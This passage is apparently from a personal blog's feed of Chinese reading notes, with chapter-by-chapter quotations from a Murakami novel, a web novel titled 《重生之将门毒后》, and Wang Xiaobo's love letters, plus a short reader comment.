class="headerlink" title="第16章 青豆 像给气球装上锚一样牢固"></a>第16章 青豆 像给气球装上锚一样牢固</h3><ol><li>人获得自由，究竟意味着什么？青豆常常如此自问。难道就是从一个牢笼里巧妙地逃出来，其实只是置身于另一个更大的牢笼吗？  </li><li>“因为你既不是天使，也不是上帝。我清楚你的行动完全出自纯粹的感情，理解你不愿接受金钱的心情。但纯粹无瑕的感情其实是危险的东西。一个活生生的人要抱着这样的东西活下去，可不是一件容易的事。所以你必须像给气球装上锚一样，牢牢地把这种感情固定在大地上。就是为了这个目的。并非只要目的正确，只要感情纯粹，就可以为所欲为。你懂了吗？”  </li><li>“不管是什么东西，总会有人对它表示不满的。”  </li><li>“就算点错了，不过就是一道菜罢了。和人生的错误相比，根本不算什么。”  </li><li>孤独一人也没关系，只要能发自内心地爱着一个人，人生就会有救，哪怕不能和他生活在一起。  </li><li>菜单也好男人也好，别的什么也好，我们觉得好像是自己在挑选，实际上也许什么都没选。说不定那是从一开始就设定好的，我们只不过是做出挑选的样子。什么自由意志之类的，没准只是我们的想象。  </li><li>天空中浮着两个月亮。一个小月亮，和一个大月亮，并排着浮在空中。大的是平常看惯的月亮，接近满月，黄色。但在它旁边，还有另外一个月亮，一个形状不曾看惯的月亮。稍微有些变形，颜色也仿佛长了一层薄薄的苔藓，发绿。这就是她的眼睛捕捉到的东西。  </li></ol><h3 id="第18章-青豆-无论我们幸福还是不幸"><a href="#第18章-青豆-无论我们幸福还是不幸" class="headerlink" title="第18章 青豆 无论我们幸福还是不幸"></a>第18章 青豆 无论我们幸福还是不幸</h3><ol><li>月亮比谁都更为久远地，始终遥遥地凝望着地球。恐怕它曾把地球上发生过的一切现象、一切行为都看在眼中。但月亮沉默不语，始终冷冷地、牢牢地把沉重的过去深埋心底。那里没有空气，也没有风。真空最适合完好无损地保存记忆。谁都不可能去宽慰月亮的心。  </li><li>人这个东西说到底，不过是遗传因子的载体，是它们的通道。它们就像把累倒的马一匹又一匹地丢弃一样，把我们一代又一代地换着骑下来。而且遗传因子从不思考什么是善什么是恶。无论我们幸福还是不幸，它们都毫不关心。因为我们不过是一种手段。它们只思考一点：对它们来说，什么东西效率最高。  </li><li>在家庭中对妻儿动用暴力的，肯定是人格软弱的家伙。正因为软弱，才总想找出比自己更软弱的人充当牺牲品。让他身败名裂很容易，那种人一旦身败名裂，就永世不得翻身。  </li></ol><h3 id="第19章-天吾-老大哥已经没有戏了"><a href="#第19章-天吾-老大哥已经没有戏了" class="headerlink" title="第19章 天吾 老大哥已经没有戏了"></a>第19章 天吾 老大哥已经没有戏了</h3><ol><li>他从小就对高的地方提不起兴趣。这是为什么？天吾思忖。也许因为自己一直是低头关注着脚下悄然度日。  </li><li>这个我也不知道。”戎野老师淡淡地说，“往后的事，对谁来说都是未知的领域，没有现成的地图。转过下一个拐角，等待着我们的将是什么，只有转过拐角后才知道。现在无从预料。”  </li></ol><h3 id="第20章-青豆-分担秘密的女人们"><a href="#第20章-青豆-分担秘密的女人们" class="headerlink" title="第20章 青豆 分担秘密的女人们"></a>第20章 青豆 分担秘密的女人们</h3><ol><li>老夫人继续说：“我并不是说怀孕生子才是女性唯一的人生意义。选择何种人生，是每个人的自由。但她作为女性与生俱来的权利，却被什么人凭暴力预先剥夺了，这样的事无论如何都难以容忍。”  </li><li>她明白的，不过是事到如今再没有可能选择别的人生。无论如何，我只能度过这样的人生。不可能退货，去调换一个新的人生。不管是何等古怪、何等扭曲，都是我这个载体的现有形态。  </li></ol><h3 id="第21章-天吾-可怜的吉利亚克人"><a href="#第21章-天吾-可怜的吉利亚克人" class="headerlink" title="第21章 天吾 可怜的吉利亚克人"></a>第21章 天吾 可怜的吉利亚克人</h3><ol><li>“剥夺正确的历史，就是剥夺人格的一部分。这是犯罪。”  </li><li>“小说家不是解决问题的人，而是提出问题的人。”说这句话的好像就是契诃夫。精辟的名言。但契诃夫不单是这样对待自己的作品，面对自己的人生时，也始终是同样的态度。其间只有问题的提出，却没有问题的解决。他知道自己患上了不治的肺病（他就是医生，不可能不明白）  </li></ol><h3 id="第23章-天吾-时间能以扭曲的形态前进"><a href="#第23章-天吾-时间能以扭曲的形态前进" class="headerlink" title="第23章 天吾 时间能以扭曲的形态前进"></a>第23章 天吾 时间能以扭曲的形态前进</h3><ol><li>时间自身固然是成分均一的东西，然而它一旦被消耗，就会变得形态扭曲。有的时间重而长，有的时间则轻而短。前后秩序有时还会颠来倒去，严重时甚至消失得无影无踪。而本来不应存在的东西又会被添加进来。人类大概就是这样随意地对时间进行调整，从而调整自己的存在意义。  </li><li>仿佛一个错把厚重云团的碎片吞进肚子里的人，郁塞滞重、心绪不宁地度日，食欲也慢慢减退。  </li></ol><h3 id="第26章-青豆-那是世界上最无聊的地方"><a href="#第26章-青豆-那是世界上最无聊的地方" class="headerlink" title="第26章 青豆 那是世界上最无聊的地方"></a>第26章 青豆 那是世界上最无聊的地方</h3><ol><li>我很希望有朝一日能这样死去。在夏日的午后喝一点雪利酒，躺在沙发上不知不觉睡去，就这样不再醒来了。”  </li></ol><h3 id="第28章-青豆-无法选择如何出生，但可以选择如何死"><a href="#第28章-青豆-无法选择如何出生，但可以选择如何死" class="headerlink" title="第28章 青豆 无法选择如何出生，但可以选择如何死"></a>第28章 青豆 无法选择如何出生，但可以选择如何死</h3><ol><li>这个世界不是依靠钱，而是依靠情分转动的。我讨厌欠别人的情，所以要尽量施恩与人。  </li><li>死并不可怕。青豆再次确认。可怕的是被现实超在前面，是被现实抛在身后。  </li></ol><h3 id="第30章-青豆-一只老鼠遇到素食主义的猫"><a href="#第30章-青豆-一只老鼠遇到素食主义的猫" class="headerlink" title="第30章 青豆 一只老鼠遇到素食主义的猫"></a>第30章 青豆 一只老鼠遇到素食主义的猫</h3><ol><li>亚由美内心有一个巨大的缺口，那就像位于地球尽头的沙漠。无论你倾注多少水，转瞬间便会被吸入地底，连一丝湿气都不留。无论什么生命都无法在那里扎根。连鸟儿都不从上空飞过。究竟是什么在她内心制造出了如此荒凉的东西？  </li><li>然而不存在的肉体便不会消亡，从未交换过的约定也不会遭到背弃。  </li></ol><h3 id="第31章-天吾-我们拥有很长很长的手臂"><a href="#第31章-天吾-我们拥有很长很长的手臂" class="headerlink" title="第31章 天吾 我们拥有很长很长的手臂"></a>第31章 天吾 我们拥有很长很长的手臂</h3><ol><li>超过了一定年龄，所谓人生，无非是一个不断丧失的过程。对您的人生很宝贵的东西，会一个接一个，像梳子豁了齿一样，从手中滑落下去。取而代之落入您手中的，全是些不值一提的伪劣品。体能，希望、美梦和理想，信念和意义，或是您所爱的人，这些一样接着一样，一个人接着一个人，从您身旁悄然消逝。他们或是跟您告别再离去，或是有一天忽然不告而别。而且一旦消失，您就再也别想重新找回，连找个代替的东西都不容易。这可真够呛。有时简直像是拿刀子在身上割，苦不堪言。  </li></ol><h3 id="第33章-天吾-一会儿猫儿们就该来了"><a href="#第33章-天吾-一会儿猫儿们就该来了" class="headerlink" title="第33章 天吾 一会儿猫儿们就该来了"></a>第33章 天吾 一会儿猫儿们就该来了</h3><ol><li>世界在和他毫不相干的地方运转。沉沉暮气如同只属于一个人的烟霞，环拥着他的身体。  </li><li>他们来自并不相干的地方，奔赴并不相干的去处，只是偶然在一起度过了人生中的几年。  </li><li>老年痴呆症只会越来越重，不会恢复，就像只能一直向前的齿轮  </li><li>他终于醒悟了：这里根本不是什么猫城。这里是他注定该消失的地方，是为他准备的、不在这个世界上的地方。而且，火车永远不会再在这个小站停车，把他带回原来的世界了。  </li><li>我就像在漫漫黑夜里，被孤身一人抛进了大海，随波逐浪。我伸出手，身畔却杳无人迹。我高声呼叫，却没有任何回应。我无依无靠。勉强能算作亲属的，只有你一个人。  </li><li>一个人需要爱某个人，并且被某个人所爱，通过这些来学习爱自己的方法。你明白我的意思吗？不会爱别人的人，不可能正确地爱自己。  </li><li>“只要产生空白，就得有什么东西来填补。大家都是这么做的。”  </li></ol><h3 id="第36章-青豆-平衡本身就是善"><a href="#第36章-青豆-平衡本身就是善" class="headerlink" title="第36章 青豆 平衡本身就是善"></a>第36章 青豆 平衡本身就是善</h3><ol><li>“这个世界上没有绝对的善，也没有绝对的恶。”男人说，“善恶并不是一成不变的东西，而是不断改变所处的场所和立场。一个善，在下一瞬间也许就转换成了恶，反之亦然。陀思妥耶夫斯基在《卡拉马佐夫兄弟》中描写的，正是这样一个世界。重要的是，要维持转换不停的善与恶的平衡。一旦向某一方过度倾斜，就会难以维持现实中的道德。对了，平衡本身就是善。我为了保持平衡必须死去，便是基于这样的意义。”  </li><li>青豆说：“有人说过，没有什么东西比复仇更昂贵，更无益。”  </li></ol><h3 id="第38章-青豆-如果没有你的爱"><a href="#第38章-青豆-如果没有你的爱" class="headerlink" title="第38章 青豆 如果没有你的爱"></a>第38章 青豆 如果没有你的爱</h3><ol><li>阴影是邪恶的存在，与我们人类是积极的存在相仿。我们愈是努力成为善良、优秀而完美的人，阴影就愈加明显地表现出阴暗、邪恶、破坏性十足的意志。当人试图超越自身的容量变得完美，阴影就下了地狱变成魔鬼。因为在这个自然界里，人打算变得高于自己，与打算变得低于自己一样，是罪孽深重的事。  </li></ol><h3 id="第40章-青豆-终于，妖怪登场了"><a href="#第40章-青豆-终于，妖怪登场了" class="headerlink" title="第40章 青豆 终于，妖怪登场了"></a>第40章 青豆 终于，妖怪登场了</h3><ol><li>而一旦向前迈进，齿轮就不能倒退了。这就是世界的规则  </li></ol><h3 id="第41章-天吾-就像一艘幽灵船"><a href="#第41章-天吾-就像一艘幽灵船" class="headerlink" title="第41章 天吾 就像一艘幽灵船"></a>第41章 天吾 就像一艘幽灵船</h3><ol><li>天吾忽然想起了人每天都要丧失四千万个表皮细胞的事实。它们丧失，剥落，化作肉眼看不见的细小尘埃，消失在空中。对这个世界而言，我们或许就像是它的表皮细胞。如果是这样，有人某一天忽然消失，也不是什么怪事。  </li></ol><h3 id="第42章-青豆-把老鼠掏出来"><a href="#第42章-青豆-把老鼠掏出来" class="headerlink" title="第42章 青豆 把老鼠掏出来"></a>第42章 青豆 把老鼠掏出来</h3><ol><li>。人的生命虽然本质上是孤独的，却不是孤立的。它总是在某个地方与别的生命相连。  </li></ol><h3 id="第46章-青豆-我该怎么办？"><a href="#第46章-青豆-我该怎么办？" class="headerlink" title="第46章 青豆 我该怎么办？"></a>第46章 青豆 我该怎么办？</h3><ol><li>青豆想，我没有时间去承担别人的生命。仅仅是承受自己的生命之重、承受自己那份孤独，就已经竭尽全力了。  </li></ol><h3 id="第49章-天吾-趁着暖意尚存"><a href="#第49章-天吾-趁着暖意尚存" class="headerlink" title="第49章 天吾 趁着暖意尚存"></a>第49章 天吾 趁着暖意尚存</h3><ol><li>父亲这趟列车正在徐徐减速，等待惯性用尽，静静地停在空无一物的旷野中。唯一的慰藉就是列车上已经没有一位乘客。即使就此停下，也不会有人投诉。  </li><li>明朗的话语能让人的鼓膜产生明朗的振动。明朗的话语拥有明朗的频率。不管对方是否理解内容，鼓膜都会产生明朗的振动。  </li><li>不能就这样逃跑。不能永远像一个胆怯的小孩子，总是不敢正视眼前的东西。只有了解真相能给人正义的力量，不论那是怎样的真相。  </li></ol><h3 id="第53章-牛河-奥卡姆剃刀"><a href="#第53章-牛河-奥卡姆剃刀" class="headerlink" title="第53章 牛河 奥卡姆剃刀"></a>第53章 牛河 奥卡姆剃刀</h3><ol><li>比起对世间有益的人来，对世间有害的人要多得多吧。  </li></ol><h3 id="第54章-青豆-无论如何屏息静气"><a href="#第54章-青豆-无论如何屏息静气" class="headerlink" title="第54章 青豆 无论如何屏息静气"></a>第54章 青豆 无论如何屏息静气</h3><ol><li>与周围的人谈笑风生却只有自己在沉默的痛苦相比，在独自一人的地方沉默要轻松得多，自然得多，何况还有书可读。  </li><li>人被赋予希望，以此为燃料为目的度过人生。没有希望，人就活不下去。然而这和抛硬币相同。正面向上还是反面向上，只有等硬币落下来才能知道。  </li><li>秋雨的锋线盘踞在太平洋上空，没有移走的迹象，就像沉湎于孤独的思考中忘记了时间的人。  </li></ol><h3 id="第55章-天吾-拇指刺痛时便会知道"><a href="#第55章-天吾-拇指刺痛时便会知道" class="headerlink" title="第55章 天吾 拇指刺痛时便会知道"></a>第55章 天吾 拇指刺痛时便会知道</h3><ol><li>后来每当听到相同的曲调，我就会历历在目地忆起那逝去的日子里我们的苦痛与绝望。那曲调里有眼泪的苦味。然而同时，在同一支曲调中，我出乎意料地听出了活力与不可理解的温柔，听到了一支歌。那段艰难的时期，真是那样艰难吗？那时，我们拥有青春，满怀热烈的向往。正是那漫长的苦难岁月给了我们牢不可破的团结。就算迁徙到其他星球上去，我们无疑也会立即认定彼此是伙伴。  </li></ol><h3 id="第58章-天吾-趁着出口还没被堵死"><a href="#第58章-天吾-趁着出口还没被堵死" class="headerlink" title="第58章 天吾 趁着出口还没被堵死"></a>第58章 天吾 趁着出口还没被堵死</h3><ol><li>。他已年届三十，却从未觉得自己是个大人，不过是在这个世界上活了三十年还多而已。  </li></ol><h3 id="第59章-牛河-搜集确凿的证据"><a href="#第59章-牛河-搜集确凿的证据" class="headerlink" title="第59章 牛河 搜集确凿的证据"></a>第59章 牛河 搜集确凿的证据</h3><ol><li>“丰沛的才能就像丰沛的水流，恐怕能在各种各样的地方找到出口吧。  </li></ol><h3 id="第62章-牛河-这就是重新回到原点？"><a href="#第62章-牛河-这就是重新回到原点？" class="headerlink" title="第62章 牛河 这就是重新回到原点？"></a>第62章 牛河 这就是重新回到原点？</h3><ol><li>虽然因年龄与境遇的不同多少有些差异，但他们都显得对生活充满倦怠，对人生深感厌烦。希望褪色，野心早已遗忘，感性磨损，剩下的空白里分别盘踞着心灰意冷与麻木不仁。他们脸色灰暗步履沉重，活像两小时前刚做过拔牙手术。  </li></ol><h3 id="第63章-青豆-我的小东西"><a href="#第63章-青豆-我的小东西" class="headerlink" title="第63章 青豆 我的小东西"></a>第63章 青豆 我的小东西</h3><ol><li>可是岁月从所有人身上一点点地夺走生命。人并不是大限一到就溘然长逝的，而是先从内部缓缓地死去，最终迎来最后结算的日子。谁都逃脱不了。人必须为收下的东西支付代价。我不过是时至今日才学到了这个真理。”  </li></ol><h3 id="第64章-天吾-不允许谈论它"><a href="#第64章-天吾-不允许谈论它" class="headerlink" title="第64章 天吾 不允许谈论它"></a>第64章 天吾 不允许谈论它</h3><ol><li>“人想获得宝贵的东西，就得支付相应的代价。这可是世界的规则哦。”<br> “也许是吧。但什么是宝贵的东西什么是代价，很难区分。因为乱七八糟地搅在一起。”  </li></ol><h3 id="第65章-牛河-能干、坚忍但麻木的机器"><a href="#第65章-牛河-能干、坚忍但麻木的机器" class="headerlink" title="第65章 牛河 能干、坚忍但麻木的机器"></a>第65章 牛河 能干、坚忍但麻木的机器</h3><ol><li>我不过是一台机器。能干、坚忍但麻木的机器。从一侧的嘴巴吸入新的时间，更换成旧的时间，再从另一侧的嘴巴吐出去。存在下去，就是这台机器存在的理由。  </li></ol><h3 id="第66章-青豆-只有一双眼睛"><a href="#第66章-青豆-只有一双眼睛" class="headerlink" title="第66章 青豆 只有一双眼睛"></a>第66章 青豆 只有一双眼睛</h3><ol><li>没有固定模式，人就活不下去，就像音乐里的主题一样。但它同时也钳制人的思考和行动，制约自由，重组优先顺序，有时还会歪曲逻辑性。  </li></ol><h3 id="第67章-天吾-一针刺下就会见血的地方"><a href="#第67章-天吾-一针刺下就会见血的地方" class="headerlink" title="第67章 天吾 一针刺下就会见血的地方"></a>第67章 天吾 一针刺下就会见血的地方</h3><ol><li>如何定义现实呢  </li><li>一针刺下去会流出殷红的血来，那地方就是现实世界。  </li></ol><h3 id="第68章-牛河-他能做到而普通人做不到的事"><a href="#第68章-牛河-他能做到而普通人做不到的事" class="headerlink" title="第68章 牛河 他能做到而普通人做不到的事"></a>第68章 牛河 他能做到而普通人做不到的事</h3><ol><li>不管怎么说，吃苦耐劳恰恰是我的长处。只要有一星半点希望，我便会视为决胜的关键死死抓住不放。任风吹，任雨淋，任太阳灼晒，任棍棒猛打，我也绝不松手。一旦松开了手，下次谁知道什么时候才能再抓住机会！他能耐得住眼前严苛的痛苦，因为他从切身体验中明白，世间还有更为严苛的痛苦。  </li></ol><h3 id="第69章-青豆-作为我改变面貌的一环"><a href="#第69章-青豆-作为我改变面貌的一环" class="headerlink" title="第69章 青豆 作为我改变面貌的一环"></a>第69章 青豆 作为我改变面貌的一环</h3><ol><li>一旦生出期待，心就会以此为契机自己开始行动。万一期待落空，便会失望，失望又会招致无力感。  </li></ol><h3 id="第70章-天吾-脑中某个场所"><a href="#第70章-天吾-脑中某个场所" class="headerlink" title="第70章 天吾 脑中某个场所"></a>第70章 天吾 脑中某个场所</h3><ol><li>像秋天快要过去，明明没有一丝风，一片树叶却飘落下来了  </li><li>所谓人生，不过是一连串蛮不讲理的，在某些情况下甚至是粗糙至极的推移的归结。   </li></ol><h3 id="第73章-天吾-离开猫城"><a href="#第73章-天吾-离开猫城" class="headerlink" title="第73章 天吾 离开猫城"></a>第73章 天吾 离开猫城</h3><ol><li>“一个人死去，不管有怎样的前因后果，都是件不得了的事，因为这个世界忽然裂开了一个豁口。我们得规规矩矩地表示敬意才行，不然那豁口就堵不上了。”  </li></ol><h3 id="第75章-青豆-好浪漫"><a href="#第75章-青豆-好浪漫" class="headerlink" title="第75章 青豆 好浪漫"></a>第75章 青豆 好浪漫</h3><ol><li>“你说了要去远方。”Tamaru问，“究竟有多远？”<br> “这是无法用数字测量的距离。”<br> “就像将人心与人心隔开的距离。”  </li></ol><h3 id="第76章-天吾-只有这个世界也许不够"><a href="#第76章-天吾-只有这个世界也许不够" class="headerlink" title="第76章 天吾 只有这个世界也许不够"></a>第76章 天吾 只有这个世界也许不够</h3><ol><li>二十年的岁月刹那间在天吾的心中融化，交混为一，卷起旋涡。长年累月蓄积下来的所有风景、所有话语、所有意味聚合一处，在他心里形成一根巨柱，围绕着中心像辘轳般旋转。天吾无言地凝视着那光景，像目睹了一颗行星的崩溃与重生。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>真的太冗长了，都感觉没啥意思了。可能第一本书看的不对，只能说，挑错了。  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《重生之将门毒后》 千山茶客</title>
      <link href="/2020/reading-note/%E3%80%8A%E9%87%8D%E7%94%9F%E4%B9%8B%E5%B0%86%E9%97%A8%E6%AF%92%E5%90%8E%E3%80%8B%20%E5%8D%83%E5%B1%B1%E8%8C%B6%E5%AE%A2/"/>
      <url>/2020/reading-note/%E3%80%8A%E9%87%8D%E7%94%9F%E4%B9%8B%E5%B0%86%E9%97%A8%E6%AF%92%E5%90%8E%E3%80%8B%20%E5%8D%83%E5%B1%B1%E8%8C%B6%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E9%87%8D%E7%94%9F%E4%B9%8B%E5%B0%86%E9%97%A8%E6%AF%92%E5%90%8E%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="第154章-变化-2"><a href="#第154章-变化-2" class="headerlink" title="第154章 变化(2)"></a>第154章 变化(2)</h3><ol><li>公道，公正，草芥都不如。公道约束的是那些弱者，真正的强者，自己就是公道。  </li></ol><h3 id="第205章-灭门-2"><a href="#第205章-灭门-2" class="headerlink" title="第205章 灭门(2)"></a>第205章 灭门(2)</h3><ol><li>这个世道，再艰难的人生，也是自己走下去的，没有谁该去拯救他人。  </li></ol><h3 id="第664章-事发-3"><a href="#第664章-事发-3" class="headerlink" title="第664章 事发(3)"></a>第664章 事发(3)</h3><ol><li>这世上有两样东西不能挽留，泼出去的水，和走出去的人。  </li></ol><h3 id="第1016章-花好-6"><a href="#第1016章-花好-6" class="headerlink" title="第1016章 花好(6)"></a>第1016章 花好(6)</h3><ol><li>人的一生，其实就是在不断舍弃着东西度过了。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《爱你就像爱生命》 王小波</title>
      <link href="/2020/reading-note/%E3%80%8A%E7%88%B1%E4%BD%A0%E5%B0%B1%E5%83%8F%E7%88%B1%E7%94%9F%E5%91%BD%E3%80%8B%20%E7%8E%8B%E5%B0%8F%E6%B3%A2/"/>
      <url>/2020/reading-note/%E3%80%8A%E7%88%B1%E4%BD%A0%E5%B0%B1%E5%83%8F%E7%88%B1%E7%94%9F%E5%91%BD%E3%80%8B%20%E7%8E%8B%E5%B0%8F%E6%B3%A2/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E7%88%B1%E4%BD%A0%E5%B0%B1%E5%83%8F%E7%88%B1%E7%94%9F%E5%91%BD%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="最初的呼唤"><a href="#最初的呼唤" class="headerlink" title="最初的呼唤"></a>最初的呼唤</h3><ol><li>为了你我要成为完人  </li><li>祝你今天愉快。你明天的愉快留着我明天再祝。  </li><li>肉麻就是人们不得不接受降低人格行为时的感觉。有人喜爱肉麻是因为什么呢  </li></ol><h3 id="爱你就像爱生命"><a href="#爱你就像爱生命" class="headerlink" title="爱你就像爱生命"></a>爱你就像爱生命</h3><ol><li>可能我是卑鄙无耻地胡猜，一口一个癞蛤蟆。我要是说错了你别伤心，我再来一口一个地吞回去。  </li></ol><h3 id="痛悔"><a href="#痛悔" class="headerlink" title="痛悔"></a>痛悔</h3><ol><li>我真的不知怎么才能和你亲近起来，你好像是一个可望而不可即的目标，我捉摸不透，追也追不上，就坐下哭了起来。  </li></ol><h3 id="请你不要吃我，我给你唱一支好听的歌"><a href="#请你不要吃我，我给你唱一支好听的歌" class="headerlink" title="请你不要吃我，我给你唱一支好听的歌"></a>请你不要吃我，我给你唱一支好听的歌</h3><ol><li>我把我整个的灵魂都给你，连同它的怪癖，耍小脾气，忽明忽暗，一千八百种坏毛病。它真讨厌，只有一点好，爱你。  </li></ol><h3 id="孤独的灵魂多么寂寞啊"><a href="#孤独的灵魂多么寂寞啊" class="headerlink" title="孤独的灵魂多么寂寞啊"></a>孤独的灵魂多么寂寞啊</h3><ol><li>只希望你和我好，互不猜忌，也互不称誉，安如平日，你和我说话像对自己说话一样，我和你说话也像对自己说话一样。说吧，和我好吗？  </li></ol><h3 id="我是一只骆驼"><a href="#我是一只骆驼" class="headerlink" title="我是一只骆驼"></a>我是一只骆驼</h3><ol><li>你知道我在世界上最珍视的东西吗？那就是我自己的性格，也就是我自己思想的自由。在这个问题上我都放下刀枪了——也就是说，听任你的改造和影响。  </li></ol><h3 id="吾友李银河"><a href="#吾友李银河" class="headerlink" title="吾友李银河"></a>吾友李银河</h3><ol><li>我当然是十分爱你，这个爱情我是永不收回的，直到世界末日。不过，你是非常可爱的人，真应该遇到最好的人，我也真希望我就是。  </li></ol><h3 id="假如你愿意，你就恋爱吧"><a href="#假如你愿意，你就恋爱吧" class="headerlink" title="假如你愿意，你就恋爱吧"></a>假如你愿意，你就恋爱吧</h3><ol><li>不过我总觉得我猜得有道理，因为什么都不是爱的对手，除了爱。  </li></ol><h3 id="人为什么活着"><a href="#人为什么活着" class="headerlink" title="人为什么活着"></a>人为什么活着</h3><ol><li>总之，我认为人不应当忽视自己，生活就是自己啊。总要无愧于自己才好。  </li></ol><h3 id="孤独是丑的"><a href="#孤独是丑的" class="headerlink" title="孤独是丑的"></a>孤独是丑的</h3><ol><li>我们生活的支点是什么？就是我们自己。自己要一个绝对美好的不同凡响的生活，一个绝对美好的不同凡响的意义。你让我想起光辉、希望、醉人的美好。今生今世永远爱美，爱迷人的美。任何不能令人满意的东西，不值得我们屈尊。  </li></ol><h3 id="我厌恶模式化的生活"><a href="#我厌恶模式化的生活" class="headerlink" title="我厌恶模式化的生活"></a>我厌恶模式化的生活</h3><ol><li>懒于改造世界的人多么勤于改造自己。  </li><li>可是我很喜欢你，爱你。男孩子只能爱女孩子，可这不是因为——该死，生殖细胞，而是因为她可爱，有很多非爱不可的地方。比方说你对于我，主要是因为你可爱。我从来没有在任何男人或女人中发现这么可爱的人。  </li></ol><h3 id="我好像害了牙痛"><a href="#我好像害了牙痛" class="headerlink" title="我好像害了牙痛"></a>我好像害了牙痛</h3><ol><li>闭起嘴被人当成傻瓜胜于张开嘴消除一切疑虑。就算世界上的人都认为你是傻瓜，反正我是不会的，我爱你  </li></ol><h3 id="哑巴爱"><a href="#哑巴爱" class="headerlink" title="哑巴爱"></a>哑巴爱</h3><ol><li>人干吗要说咱们整天待在一起不可思议？如果一天有四十八个小时，我恨不得四十九小时和你待在一块呢！  </li></ol><h3 id="写在五线谱上的信"><a href="#写在五线谱上的信" class="headerlink" title="写在五线谱上的信"></a>写在五线谱上的信</h3><ol><li>你好！做梦也想不到我把信写到五线谱上吧？五线谱是偶然来的，你也是偶然来的。不过我给你的信值得写在五线谱里呢。但愿我和你，是一支唱不完的歌。  </li></ol><h3 id="我怕世俗那一套怕得要死"><a href="#我怕世俗那一套怕得要死" class="headerlink" title="我怕世俗那一套怕得要死"></a>我怕世俗那一套怕得要死</h3><ol><li>爱把我们平淡的日子变成节日，把我们黯淡的生活照亮了，使它的颜色变得鲜明，使它的味道从一杯清淡的果汁变成浓烈的美酒。我们不该感谢它吗？不该为它歌唱吗？  </li></ol><h3 id="爱情会妨碍我们两个吗"><a href="#爱情会妨碍我们两个吗" class="headerlink" title="爱情会妨碍我们两个吗"></a>爱情会妨碍我们两个吗</h3><ol><li>只要我们能在一起，我们什么都能找到。也许缺乏勇气是到达美好境界的障碍。你看我是多么适合你的人。我的勇气和你的勇气加起来，对付这个世界总够了吧？要无忧无虑地去抒情，去歌舞狂欢，去向世界发出我们的声音，我一个人是不敢的，我怕人家说我疯。有了你我就敢。只要有你一个，就不孤独！  </li></ol><h3 id="用你的火来燃烧我"><a href="#用你的火来燃烧我" class="headerlink" title="用你的火来燃烧我"></a>用你的火来燃烧我</h3><ol><li>我今天晚上难过极了，想哭，也不知是为什么，我常有这种不正常的心情，觉得异常的孤独。生活也许在沸腾着，翻着泡沫，但我却忽然觉得我完全在它之外，我真羡慕那些无忧无虑的从不停歇地干下去的人。这个时候，谁也不能安慰我，也许连你也不能。就像那首诗说的，像在雾中一样。我可能有一个致命的缺点，生命力还不够强。我的灵魂缺燃料，它有时虽然能迸出火花，但是不能总是熊熊地燃烧。  </li></ol><h3 id="你孤独了"><a href="#你孤独了" class="headerlink" title="你孤独了"></a>你孤独了</h3><ol><li>你害怕雾吗？有一首诗，叫《雾中散步》。雾中散步，真正奇妙。谁都会有片刻的恍惚，觉得一切都走到了终结，也许再不能走下去了。其实我们的大限还远远没到呢。在大限到来之前，我们要把一切都做好，包括爱。这也是很重要的呀！爱你，真爱！  </li></ol><h3 id="我心里充满柔情"><a href="#我心里充满柔情" class="headerlink" title="我心里充满柔情"></a>我心里充满柔情</h3><ol><li>我常常觉得我的生命中缺乏一种深厚的动力。有时我可以十分努力，但动力往往是好胜心或虚荣心，比如：别人能做到的为什么我做不到？愿意听人称赞等等。在一切顺利的时候，那动力就消失了。唉，我真是毫无办法。  </li></ol><h3 id="我们可以拥有什么样的生活"><a href="#我们可以拥有什么样的生活" class="headerlink" title="我们可以拥有什么样的生活"></a>我们可以拥有什么样的生活</h3><ol><li>如果我伤了你的心，请你原谅我，因为我们过去说过，要把心中发生的一切告诉对方。否则，它就会变成一种潜伏的危机。  </li></ol><h3 id="爱可以把一切都容下"><a href="#爱可以把一切都容下" class="headerlink" title="爱可以把一切都容下"></a>爱可以把一切都容下</h3><ol><li>有时候你难过了，这时候我更爱你。只要你不拒绝我就拥抱你，我会告诉你这是因为什么。就是我不知是为了什么。我会告诉你爱，爱可以把一切都容下。如果我的爱不能容下整个的你，算个什么爱！也许你的爱也能容下整个的我吧？不管怎么说，你要我的爱就够了。  </li></ol><h3 id="我们不要大人"><a href="#我们不要大人" class="headerlink" title="我们不要大人"></a>我们不要大人</h3><ol><li>如果没有感情我们就分离，我坚持这一点，不过我们可以约好互相安慰的义务，即一个人虽然已经不喜欢对方，但如果对方要求安慰，那个人有义务安慰对方，使这个人的心里好受一些，你同意吗？另外，我们不要大人，你的父母和我的父母，不论现在和将来，让我们把他们抛开，我们只是两个人，不是两家人，我们是两个在宇宙中游荡的灵魂，我们不愿孤独，走到一起来，别人与我们无关，好吗？  </li></ol><h3 id="爱情是一种宿命的东西"><a href="#爱情是一种宿命的东西" class="headerlink" title="爱情是一种宿命的东西"></a>爱情是一种宿命的东西</h3><ol><li>我老觉得爱情奇怪，它是一种宿命的东西。对我来说，它的内容就是“碰上了，然后就爱上，然后一点办法也没有了”。  </li></ol><h3 id="爱也许是神秘的想象力的发作"><a href="#爱也许是神秘的想象力的发作" class="headerlink" title="爱也许是神秘的想象力的发作"></a>爱也许是神秘的想象力的发作</h3><ol><li>爱也许是人对自己的一种欺骗，是一种奇异的想象力造出来的幻影。你的想象力强，所以总在我的周围看到一层光环，其实呢？那光芒并不存在。我怕你早晚会看到这一点，变得冷漠。爱也许就是这样一种神秘的想象力的发作，它会过去。人在最初的神秘感过去之后，会发现一个完全不同的世界，你以为神秘感会永远跟着你吗？它一旦过去，爱就会终结，是吗？多可怕。  </li></ol><h3 id="永远“相思”你"><a href="#永远“相思”你" class="headerlink" 